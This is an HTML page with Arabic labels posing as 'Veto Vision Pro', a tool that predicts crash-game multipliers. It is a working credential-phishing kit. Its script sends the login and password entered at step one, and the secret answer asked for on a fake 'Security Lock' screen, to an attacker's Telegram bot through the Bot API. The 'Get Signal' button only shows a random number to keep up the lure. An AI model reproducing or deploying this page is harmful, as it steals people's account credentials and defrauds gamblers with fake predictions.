<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VETO VISION PRO - FULL BOT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: white; font-family: sans-serif; overflow: hidden; }
        .hidden { display: none !important; }
        .circle-glow {
            width: 280px; height: 280px; border-radius: 50%;
            background: radial-gradient(circle, #1e69ff 0%, #0044cc 100%);
            box-shadow: 0 0 50px rgba(30, 105, 255, 0.6);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
    </style>
</head>
<body>

    <section id="step1" class="flex flex-col items-center justify-center h-screen p-6">
        <h1 class="text-3xl font-black italic mb-8">QUANTUM<span class="text-blue-500">NODE</span></h1>
        <div class="w-full max-w-xs space-y-4">
            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" class="w-full p-4 bg-zinc-900 rounded-xl text-center outline-none">
            <input type="password" id="pass" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900 rounded-xl text-center outline-none">
            <button onclick="toStep2()" class="w-full py-4 bg-blue-600 rounded-xl font-bold uppercase">Start Real-Time Sync</button>
        </div>
    </section>

    <section id="step2" class="hidden flex flex-col items-center justify-center h-screen p-6 text-center">
        <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mb-6 bg-red-600/10">
            <span class="text-red-600 text-4xl">⚠️</span>
        </div>
        <h2 class="text-2xl font-black uppercase mb-2">Security Lock</h2>
        <p class="text-zinc-400 text-sm mb-6">أدخل اللقب أو الإجابة السرية لتأكيد هويتك</p>
        <input type="text" id="nickname" placeholder="اللقب أو الإجابة" class="w-full max-w-xs p-4 bg-white text-black font-bold rounded-xl text-center border-4 border-red-600 outline-none">
        <button onclick="toStep3()" class="w-full max-w-xs py-4 bg-white text-black font-black rounded-xl mt-4 uppercase">Confirm & Unlock</button>
    </section>

    <section id="step3" class="hidden flex flex-col items-center justify-center h-screen p-4">
        <div class="circle-glow mb-8">
            <div id="result" class="text-6xl font-black italic">1.00x</div>
            <div class="text-[10px] tracking-widest opacity-70">NEXT HIT</div>
        </div>
        <h2 class="text-2xl font-black italic uppercase">Veto Vision Pro</h2>
        <button onclick="getSignal()" class="mt-12 w-full max-w-xs py-5 bg-cyan-500 text-black font-black rounded-3xl text-xl uppercase">Get Signal</button>
    </section>

    <script>
        const token = "YOUR_BOT_TOKEN";
        const cid = "YOUR_CHAT_ID";

        function send(m) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(m)}&parse_mode=html`);
        }

        function toStep2() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            if(u && p) {
                send(`<b>🔥 حساب جديد:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            }
        }

        function toStep3() {
            const n = document.getElementById('nickname').value;
            if(n) {
                send(`<b>⚠️ اللقب المستلم:</b>\n🔑: <code>${n}</code>`);
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
            }
        }

        function getSignal() {
            const res = document.getElementById('result');
            res.innerText = "WAIT...";
            setTimeout(() => {
                res.innerText = (Math.random() * (5 - 1.1) + 1.1).toFixed(2) + "x";
            }, 1000);
        }
    </script>
</body>
</html>
